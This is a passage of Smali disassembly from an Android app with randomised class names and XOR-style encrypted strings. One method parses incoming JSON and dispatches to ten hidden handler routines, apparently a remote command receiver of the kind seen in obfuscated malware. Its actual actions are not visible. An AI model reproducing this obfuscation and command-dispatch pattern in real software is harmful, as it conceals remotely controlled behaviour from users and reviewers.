    invoke-static {p0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->b(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p0

    if-eqz p0, :cond_0

    new-array p0, v4, [B

    const/16 v2, -0x28

    aput-byte v2, p0, v1

    new-array v1, v5, [B

    fill-array-data v1, :array_3f

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    new-array p0, v4, [B

    const/16 v2, 0x5e

    aput-byte v2, p0, v1

    new-array v1, v5, [B

    fill-array-data v1, :array_40

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    :goto_0
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    nop

    :array_0
    .array-data 1
        0x11t
        -0x75t
        0x2at
        -0x51t
        -0x47t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x44t
        -0x21t
        0x6ct
        -0x7et
        -0x7ft
        -0x76t
        0x5bt
        0x69t
    .end array-data

    :array_2
    .array-data 1
        0x6dt
        -0x65t
        0x23t
        0x16t
        0x6bt
        -0x2dt
        -0x6dt
        -0x5ct
        0x2at
        -0x7at
        0x2et
        0x44t
    .end array-data

    :array_3
    .array-data 1
        0x4bt
        -0x15t
        0x4bt
        0x79t
        0x5t
        -0x4at
        -0x34t
        -0x36t
    .end array-data

    :array_4
    .array-data 1
        -0x10t
        -0x24t
        -0x19t
        -0xet
        -0x28t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x5bt
        -0x78t
        -0x5ft
        -0x21t
        -0x20t
        -0x2t
        0x12t
        0x46t
    .end array-data

    :array_6
    .array-data 1
        0x70t
        -0x7dt
        0x20t
        0x1dt
        0x37t
        0x35t
        -0x34t
        -0x2t
        0x9t
        -0x6ct
        0x2bt
        0xbt
        0x36t
        0x33t
        -0x36t
        -0xct
        0x6bt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x56t
        -0x1et
        0x4et
        0x79t
        0x45t
        0x5at
        -0x5bt
        -0x66t
    .end array-data

    :array_8
    .array-data 1
        0x7at
        0x6ct
        0x14t
        -0x5ct
        0x12t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x2ft
        0x38t
        0x52t
        -0x77t
        0x2at
        0x2t
        0x15t
        -0x7t
    .end array-data

    :array_a
    .array-data 1
        -0x40t
        -0x80t
        -0x7t
        -0x11t
        -0x78t
        0x44t
        -0x6dt
    .end array-data

    :array_b
    .array-data 1
        -0x1at
        -0x13t
        -0x6at
        -0x75t
        -0x13t
        0x28t
        -0x52t
        0x14t
    .end array-data

    :array_c
    .array-data 1
        -0x52t
        0x7at
        0x13t
        -0x6at
        -0x3et
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x5t
        0x2et
        0x55t
        -0x45t
        -0x6t
        0x69t
        0x20t
        0x4bt
    .end array-data

    :array_e
    .array-data 1
        0xet
        -0x7bt
        -0x41t
        0x9t
        -0x56t
        0x9t
        -0x25t
        -0x36t
        0x77t
        -0x7ct
        -0x4at
        0x1ct
        -0x54t
        0xbt
        -0x34t
        -0x72t
    .end array-data

    :array_f
    .array-data 1
        0x28t
        -0x19t
        -0x22t
        0x7dt
        -0x22t
        0x6ct
        -0x57t
        -0x4dt
    .end array-data

    :array_10
    .array-data 1
        0x59t
        0x3at
        0xbt
        -0x54t
        0x4at
    .end array-data

    nop

    :array_11
    .array-data 1
        0xct
        0x6et
        0x4dt
        -0x7ft
        0x72t
        -0x6dt
        -0x77t
        -0x58t
    .end array-data

    :array_12
    .array-data 1
        0x5ct
        -0x18t
        0x63t
        -0x7ct
        -0x9t
        0x11t
        0x7bt
        -0x6dt
        0x47t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x7at
        -0x7at
        0x6t
        -0x10t
        -0x80t
        0x7et
        0x9t
        -0x8t
    .end array-data

    :array_14
    .array-data 1
        -0x65t
        0x6bt
        -0x6bt
        0x2ct
        0x1ft
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x32t
        0x3ft
        -0x2dt
        0x1t
        0x27t
        0x73t
        0x50t
        0x7at
    .end array-data

    :array_16
    .array-data 1
        -0x61t
        -0x5dt
        -0x51t
        -0x24t
        -0x4ft
        -0x6at
        -0x2at
        -0x30t
        -0x1at
        -0x52t
        -0x60t
        -0x25t
        -0x60t
        -0x36t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x47t
        -0x36t
        -0x3ft
        -0x51t
        -0x3bt
        -0x9t
        -0x46t
        -0x44t
    .end array-data

    :array_18
    .array-data 1
        -0x30t
        -0x6et
        -0x75t
        -0x41t
        0x38t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x7bt
        -0x3at
        -0x33t
        -0x6et
        0x0t
        0x49t
        -0x4ft
        0x2t
    .end array-data

    :array_1a
    .array-data 1
        -0x5ct
        0x7at
        -0x48t
        0x2t
        0x70t
        0x1ft
        -0x30t
        -0x10t
    .end array-data

    :array_1b
    .array-data 1
        0x6t
        0x7et
        -0x24t
        0x2bt
        -0x45t
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x53t
        0x2at
        -0x66t
        0x6t
        -0x7dt
        -0x2bt
        -0x38t
        -0xat
    .end array-data

    :array_1d
    .array-data 1
        -0x46t
        -0x2ct
        0x1dt
        0x22t
        -0x37t
        -0x7dt
        -0x5ft
        -0x36t
        -0x5ft
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x64t
        -0x5dt
        0x7ct
        0x4et
        -0x5bt
        -0xdt
        -0x40t
        -0x46t
    .end array-data

    :array_1f
    .array-data 1
        -0x43t
        -0x3dt
        0x49t
        0xat
        -0x8t
    .end array-data

    nop

    :array_20
    .array-data 1
        -0x18t
        -0x69t
        0xft
        0x27t
        -0x40t
        0x6dt
        0x77t
        0x73t
    .end array-data

    :array_21
    .array-data 1
        0x52t
        0x39t
        0x73t
        0x62t
        -0x62t
        0x44t
        -0x1ct
        0x69t
        0x15t
        0x3at
        0x68t
        0x7at
        -0x61t
        0x53t
        -0x21t
        0x24t
    .end array-data

    :array_22
    .array-data 1
        0x74t
        0x49t
        0x1bt
        0xdt
        -0x10t
        0x21t
        -0x45t
        0x19t
    .end array-data

    :array_23
    .array-data 1
        -0x5bt
        -0x54t
        -0x5t
        0x15t
        -0x4ct
    .end array-data

    nop

    :array_24
    .array-data 1
        -0x10t
        -0x8t
        -0x43t
        0x38t
        -0x74t
        0x31t
        0x49t
        -0x50t
    .end array-data

    :array_25
    .array-data 1
        -0x18t
        0x73t
        0x0t
        -0x3at
        0x29t
        -0x78t
        0x4at
        -0x47t
        -0x45t
        0x6et
        0xat
        -0x34t
        0x35t
        -0x30t
    .end array-data

    nop

    :array_26
    .array-data 1
        -0x32t
        0x3t
        0x68t
        -0x57t
        0x47t
        -0x13t
        0x15t
        -0x29t
    .end array-data

    :array_27
    .array-data 1
        -0x14t
        -0x6ct
        -0x20t
        -0x13t
        -0x72t
    .end array-data

    nop

    :array_28
    .array-data 1
        -0x47t
        -0x40t
        -0x5at
        -0x40t
        -0x4at
        0x2et
        0xct
        -0x28t
    .end array-data

    :array_29
    .array-data 1
        -0x13t
        0x2ft
        -0x14t
        0x6bt
        0x36t
        -0x6bt
        0xbt
        0x42t
    .end array-data

    :array_2a
    .array-data 1
        -0x35t
        0x4et
        -0x71t
        0x1ft
        0x5ft
        -0x1dt
        0x71t
        0x7ft
    .end array-data

    :array_2b
    .array-data 1
        0x72t
        -0x2et
        -0x9t
        0x44t
        -0x63t
    .end array-data

    nop

    :array_2c
    .array-data 1
        0x27t
        -0x7at
        -0x4ft
        0x69t
        -0x5bt
        0x4t
        0x32t
        0x5t
    .end array-data

    :array_2d
    .array-data 1
        0x3ft
        -0x4dt
        -0x37t
        0x13t
        -0x39t
        -0x45t
        0x1t
        -0x74t
        0x24t
    .end array-data

    nop

    :array_2e
    .array-data 1
        0x19t
        -0x29t
        -0x60t
        0x60t
        -0x49t
        -0x29t
        0x60t
        -0xbt
    .end array-data

    :array_2f
    .array-data 1
        -0xct
        0x0t
        0x4t
        0x2ft
        -0x5et
    .end array-data

    nop

    :array_30
    .array-data 1
        -0x5ft
        0x54t
        0x42t
        0x2t
        -0x66t
        0x54t
        -0x5dt
        0x13t
    .end array-data

    :array_31
    .array-data 1
        0x7ct
        0x1ct
        -0x52t
        0x53t
    .end array-data

    :array_32
    .array-data 1
        0x5at
        0x75t
        -0x22t
        0x6et
        -0x64t
        0x68t
        -0x39t
        0x7ft
    .end array-data

    :array_33
    .array-data 1
        -0x8t
        -0x77t
        0x7at
        0x3t
        0x24t
    .end array-data

    nop

    :array_34
    .array-data 1
        -0x53t
        -0x23t
        0x3ct
        0x2et
        0x1ct
        0x19t
        -0x27t
        -0x2bt
    .end array-data

    :array_35
    .array-data 1
        -0x1at
        -0x1dt
        -0x8t
        0xat
        -0x3ft
        0x8t
        0x4et
        0x16t
        -0x3t
    .end array-data

    nop

    :array_36
    .array-data 1
        -0x40t
        -0x80t
        -0x69t
        0x7ft
        -0x51t
        0x7ct
        0x3ct
        0x6ft
    .end array-data

    :array_37
    .array-data 1
        0x7et
        -0x3dt
        -0x4ct
        -0x72t
        0x57t
    .end array-data

    nop

    :array_38
    .array-data 1
        0x2bt
        -0x69t
        -0xet
        -0x5dt
        0x6ft
        -0x6ft
        0xdt
        -0xdt
    .end array-data

    :array_39
    .array-data 1
        -0x41t
        0x40t
        0x5et
        0x51t
        0x2t
        -0x77t
        -0x79t
        0x50t
        -0x5ct
    .end array-data

    nop

    :array_3a
    .array-data 1
        -0x67t
        0x2bt
        0x3bt
        0x28t
        0x6et
        -0x1at
        -0x20t
        0x23t
    .end array-data

    :array_3b
    .array-data 1
        0x47t
        -0x51t
        0x6at
        -0x17t
        -0x5ct
    .end array-data

    nop

    :array_3c
    .array-data 1
        0x12t
        -0x5t
        0x2ct
        -0x3ct
        -0x64t
        -0x10t
        0x50t
        0x0t
    .end array-data

    :array_3d
    .array-data 1
        0x26t
        0x5ft
        0x7ct
        0x2dt
        -0xft
        0x3ct
        -0x10t
        0x38t
        0x62t
        0x57t
        0x73t
        0x27t
        -0x20t
        0x36t
        -0x42t
    .end array-data

    :array_3e
    .array-data 1
        0x0t
        0x3et
        0x1ft
        0x4et
        -0x6ct
        0x4ft
        -0x7dt
        0x51t
    .end array-data

    :array_3f
    .array-data 1
        -0x17t
        0x63t
        0x35t
        -0x72t
        -0x68t
        0x5dt
        0x5t
        0x40t
    .end array-data

    :array_40
    .array-data 1
        0x6et
        0x11t
        -0x7ct
        0x26t
        0xat
        0x37t
        0x5t
        -0x34t
    .end array-data
.end method

.method private q()V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/16 v1, 0x9

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_0
    return-void

    :array_0
    .array-data 1
        -0x46t
        0x50t
        -0x3ft
        0x63t
        -0x1at
        0x8t
        0x11t
        0x28t
        -0x4ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0xat
        0x19t
        -0x69t
        0x26t
        -0x47t
        0x43t
        0x5dt
        0x67t
    .end array-data

    :array_2
    .array-data 1
        -0x16t
        0x2t
        0x9t
        -0x48t
        -0x3t
        -0x29t
        -0x61t
        -0x59t
        -0x1ft
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x5at
        0x4bt
        0x5ft
        -0x3t
        -0x5et
        -0x64t
        -0x2dt
        -0x18t
    .end array-data
.end method

.method private r(Ljava/lang/String;)V
    .locals 9

    .line 1
    const/4 v0, 0x0

    const/16 v1, 0x8

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 p1, 0x4

    new-array v3, p1, [B

    fill-array-data v3, :array_0

    new-array v4, v1, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x5

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    new-array v6, v1, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/4 v6, 0x6

    const/4 v7, 0x2

    const/4 v8, 0x3

    sparse-switch v5, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array p1, v4, [B

    fill-array-data p1, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x7

    goto/16 :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_2

    :sswitch_1
    new-array p1, v4, [B

    fill-array-data p1, :array_6

    new-array v4, v1, [B

    fill-array-data v4, :array_7

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    goto/16 :goto_1

    :sswitch_2
    new-array v4, p1, [B

    fill-array-data v4, :array_8

    new-array v5, v1, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    goto/16 :goto_1

    :sswitch_3
    new-array p1, v8, [B

    fill-array-data p1, :array_a

    new-array v4, v1, [B

    fill-array-data v4, :array_b

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v0

    goto/16 :goto_1

    :sswitch_4
    new-array p1, v8, [B

    fill-array-data p1, :array_c

    new-array v4, v1, [B

    fill-array-data v4, :array_d

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v7

    goto/16 :goto_1

    :sswitch_5
    new-array p1, v8, [B

    fill-array-data p1, :array_e

    new-array v4, v1, [B

    fill-array-data v4, :array_f

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v8

    goto :goto_1

    :sswitch_6
    new-array p1, v7, [B

    fill-array-data p1, :array_10

    new-array v4, v1, [B

    fill-array-data v4, :array_11

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v1

    goto :goto_1

    :sswitch_7
    const/16 p1, 0xa

    new-array p1, p1, [B

    fill-array-data p1, :array_12

    new-array v4, v1, [B

    fill-array-data v4, :array_13

    invoke-static {p1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v6

    goto :goto_1

    :sswitch_8
    const/16 p1, 0x9

    new-array v4, p1, [B

    fill-array-data v4, :array_14

    new-array v5, v1, [B

    fill-array-data v5, :array_15

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    goto :goto_1

    :sswitch_9
    new-array p1, v6, [B

    fill-array-data p1, :array_16

    new-array v5, v1, [B

    fill-array-data v5, :array_17

    invoke-static {p1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v4

    goto :goto_1

    :cond_0
    :goto_0
    const/4 p1, -0x1

    :goto_1
    packed-switch p1, :pswitch_data_0

    goto :goto_3

    :pswitch_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->D()V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->o()V

    goto :goto_3

    :pswitch_1
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->j(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_2
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->d(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_3
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->i(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_4
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->h(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_5
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->e(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_6
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->f(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_7
    invoke-static {v2, p0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->g(Lorg/json/JSONObject;Landroid/content/Context;)V

    goto :goto_3

    :pswitch_8
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->a()V

    goto :goto_3

    :pswitch_9
    invoke-virtual {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->B()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    const/16 p1, 0xd

    new-array p1, p1, [B

    fill-array-data p1, :array_18

    new-array v1, v1, [B

    fill-array-data v1, :array_19

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    new-array v0, v0, [Ljava/lang/Object;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g()V

    :goto_3
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x361a3f94 -> :sswitch_9
        -0x22860cf7 -> :sswitch_8
        -0x18d9a691 -> :sswitch_7
        0xc41 -> :sswitch_6
        0x1a340 -> :sswitch_5
        0x1a647 -> :sswitch_4
        0x1af4e -> :sswitch_3
        0x2ff57c -> :sswitch_2
        0x5a5ddf8 -> :sswitch_1
        0x5cd06ba -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x6at
        -0x41t
        -0x54t
        -0x17t
    .end array-data

    :array_1
    .array-data 1
        0x1et
        -0x3at
        -0x24t
        -0x74t
        0x12t
        -0x16t
        -0x4at
        -0x3dt
    .end array-data

    :array_2
    .array-data 1
        -0x60t
        -0x2et
        -0x3at
        0x25t
        0x7ft
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x3bt
        -0x41t
        -0x4at
        0x51t
        0x6t
        0x5ct
        -0x14t
        0x61t
    .end array-data

    :array_4
    .array-data 1
        -0x1ct
        -0x4at
        0x5t
        0x3ft
        0x1at
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x7et
        -0x2dt
        0x71t
        0x5ct
        0x72t
        -0x1ft
        -0x53t
        -0x4at
    .end array-data

    :array_6
    .array-data 1
        0x6t
        -0x4ft
        0x16t
        0x48t
        -0xbt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x65t
        -0x23t
        0x79t
        0x3bt
        -0x70t
        0x17t
        -0x3bt
        -0x60t
    .end array-data

    :array_8
    .array-data 1
        -0x3bt
        0x58t
        -0x2t
        -0x1et
    .end array-data

    :array_9
    .array-data 1
        -0x5dt
        0x31t
        -0x6et
        -0x79t
        0x21t
        0x1et
        -0x39t
        -0x27t
    .end array-data

    :array_a
    .array-data 1
        0x1et
        0x14t
        0xat
    .end array-data

    :array_b
    .array-data 1
        0x71t
        0x61t
        0x7et
        -0x5bt
        -0x56t
        0x7dt
        0x76t
        -0x4bt
    .end array-data

    :array_c
    .array-data 1
        0x2et
        0x47t
        0x37t
    .end array-data

    :array_d
    .array-data 1
        0x43t
        0x2et
        0x54t
        0x50t
        0x6ct
        0x27t
        -0x7dt
        0x5at
    .end array-data

    :array_e
    .array-data 1
        -0x31t
        0x78t
        -0x4bt
    .end array-data

    :array_f
    .array-data 1
        -0x5dt
        0x17t
        -0x2at
        -0x4dt
        0x53t
        0x65t
        0x46t
        -0x75t
    .end array-data

    :array_10
    .array-data 1
        0xet
        0x53t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x6ct
        0x30t
        -0x34t
        0x69t
        -0x10t
        0x6et
        -0x49t
        0x71t
    .end array-data

    :array_12
    .array-data 1
        0x44t
        0x7at
        0x1t
        0x54t
        -0x46t
        -0x2bt
        0x56t
        0x52t
        0x5at
        0x7dt
    .end array-data

    nop

    :array_13
    .array-data 1
        0x37t
        0x19t
        0x73t
        0x31t
        -0x21t
        -0x45t
        0x35t
        0x3dt
    .end array-data

    :array_14
    .array-data 1
        -0x7at
        -0x6ct
        -0x2et
        -0x27t
        -0x7dt
        -0x1dt
        -0xft
        -0x38t
        -0x7ft
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x1bt
        -0x5t
        -0x44t
        -0x49t
        -0x1at
        -0x80t
        -0x7bt
        -0x53t
    .end array-data

    :array_16
    .array-data 1
        0x42t
        -0x7dt
        -0x79t
        -0x13t
        -0x47t
        0x59t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x31t
        -0x20t
        -0xbt
        -0x78t
        -0x24t
        0x37t
        0x32t
        0x27t
    .end array-data

    :array_18
    .array-data 1
        0x67t
        -0x6ft
        0x9t
        -0x1t
        -0x5at
        -0x5ct
        0x7dt
        -0x34t
        0x5dt
        -0x4at
        0x2ft
        -0x22t
        -0x73t
    .end array-data

    nop

    :array_19
    .array-data 1
        0x2dt
        -0x3et
        0x46t
        -0x4ft
        -0x1dt
        -0x24t
        0x1et
        -0x57t
    .end array-data
.end method

.method private static s(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    .line 1
    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string p0, ""

    return-object p0

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const/4 v1, 0x7

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v1

    invoke-virtual {v1, p0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

